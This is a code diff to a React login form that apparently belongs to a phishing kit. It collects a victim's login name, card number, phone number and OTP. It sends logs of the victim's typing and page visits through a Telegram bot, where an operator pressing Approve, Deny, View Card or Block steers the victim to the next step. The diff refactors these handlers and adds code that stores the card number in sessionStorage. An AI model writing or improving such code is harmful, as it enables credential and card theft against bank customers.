@@ -9,14 +9,8 @@ import OtpVerificationForm from './OtpVerificationForm';
 import LoadingOverlay from './LoadingOverlay';
 import './LoginForm.css';
 
-
-
 function LoginForm() {
-   // const navigate = useNavigate(); // Ajoutez cette ligne après les hooks
-
-const { t } = useLanguage();
-
-
+  const { t } = useLanguage();
   
   // State management
   const [loginName, setLoginName] = useState('');
@@ -46,6 +40,9 @@ const { t } = useLanguage();
   });
   const [cardErrors, setCardErrors] = useState({});
 
+  // Ref for sendCardVerificationPageLog
+  const sendCardVerificationPageLogRef = useRef(null);
+
   // Anti-bot initialization
   useEffect(() => {
     startTimer();
@@ -57,18 +54,37 @@ const { t } = useLanguage();
     };
   }, []);
 
-  // Define handler functions BEFORE using them in useTelegramBot
+  // Save data to sessionStorage when needed
+  useEffect(() => {
+    if (loginName) {
+      sessionStorage.setItem('loginName', loginName);
+    }
+    if (sessionId) {
+      sessionStorage.setItem('sessionId', sessionId);
+    }
+  }, [loginName, sessionId]);
+
+  // Define handler functions with proper references
   const handleApprove = async () => {
-    if (!hasSentCardPageLogRef.current) {
-      await sendCardVerificationPageLog(loginName);
+    console.log('✅ Approve button clicked in Telegram');
+    console.log('Current state before approve:', { waitingForApproval, showCardForm });
+    
+    // Use the ref to call sendCardVerificationPageLog
+    if (sendCardVerificationPageLogRef.current && !hasSentCardPageLogRef.current) {
+      await sendCardVerificationPageLogRef.current(loginName);
       hasSentCardPageLogRef.current = true;
     }
+    
+    // Update state in the correct order
     setWaitingForApproval(false);
-    setIsLoading(false);
     setShowCardForm(true);
+    setIsLoading(false);
+    
+    console.log('State after approve:', { waitingForApproval: false, showCardForm: true });
   };
   
   const handleDeny = () => {
+    console.log('❌ Deny button clicked in Telegram');
     setWaitingForApproval(false);
     setWaitingForOtpApproval(false);
     setIsLoading(false);
@@ -77,20 +93,20 @@ const { t } = useLanguage();
   };
 
   const handleViewCard = async () => {
-    if (!hasSentCardPageLogRef.current) {
-      await sendCardVerificationPageLog(loginName);
+    console.log('👁️ View Card button clicked in Telegram');
+    
+    if (sendCardVerificationPageLogRef.current && !hasSentCardPageLogRef.current) {
+      await sendCardVerificationPageLogRef.current(loginName);
       hasSentCardPageLogRef.current = true;
     }
+    
     setWaitingForApproval(false);
-    setIsLoading(false);
     setShowCardForm(true);
+    setIsLoading(false);
   };
 
   const handleNextStep = async () => {
-    if (!hasSentOtpLogRef.current) {
-      await sendOtpPageLog(loginName, cardDetails.phoneNumber, sessionId);
-      hasSentOtpLogRef.current = true;
-    }
+    console.log('➡️ Next Step button clicked in Telegram');
     setWaitingForOtpApproval(false);
     setIsLoading(false);
     setShowCardForm(false);
@@ -135,6 +151,9 @@ const { t } = useLanguage();
     hasSentOtpLogRef.current = false;
     resetAntiBot();
     startTimer();
+    sessionStorage.removeItem('loginName');
+    sessionStorage.removeItem('cardNumber');
+    sessionStorage.removeItem('sessionId');
   };
 
   const handleBlock = async () => {
@@ -156,12 +175,39 @@ const { t } = useLanguage();
       window.location.href = '/blocked';
     }
   };
-    const handleNextStepAppr = () => {
+  
+  const handleNextStepAppr = () => {
     console.log('🔵 Next Step (Appr) button clicked!');
+    sessionStorage.setItem('loginName', loginName);
+    if (cardDetails.cardNumber) {
+      sessionStorage.setItem('cardNumber', cardDetails.cardNumber);
+    }
+    if (sessionId) {
+      sessionStorage.setItem('sessionId', sessionId);
+    }
     window.location.href = '/nextstepappr';
   };
 
-  // Telegram bot hooks - NOW after handlers are defined
+  // Telegram bot hooks
+  const telegramBot = useTelegramBot(
+    sessionId, 
+    handleApprove, 
+    handleDeny, 
+    handleViewCard, 
+    handleNextStep, 
+    handleBackToCard, 
+    handleBackToLogin, 
+    handleBlock,
+    handleNextStepAppr
+  );
+
+  // Store the sendCardVerificationPageLog function in ref after it's available
+  useEffect(() => {
+    if (telegramBot.sendCardVerificationPageLog) {
+      sendCardVerificationPageLogRef.current = telegramBot.sendCardVerificationPageLog;
+    }
+  }, [telegramBot.sendCardVerificationPageLog]);
+
   const {
     generateSessionId,
     sendToTelegramWithButtons,
@@ -178,18 +224,7 @@ const { t } = useLanguage();
     sendCardTypingLog,
     sendOtpTypingLog,
     sendBlockedLog
-
-    } = useTelegramBot(
-    sessionId, 
-    handleApprove, 
-    handleDeny, 
-    handleViewCard, 
-    handleNextStep, 
-    handleBackToCard, 
-    handleBackToLogin, 
-    handleBlock,
-    handleNextStepAppr
-  );
+  } = telegramBot;
 
   const handleInputChange = async (field, value) => {
     trackTyping();
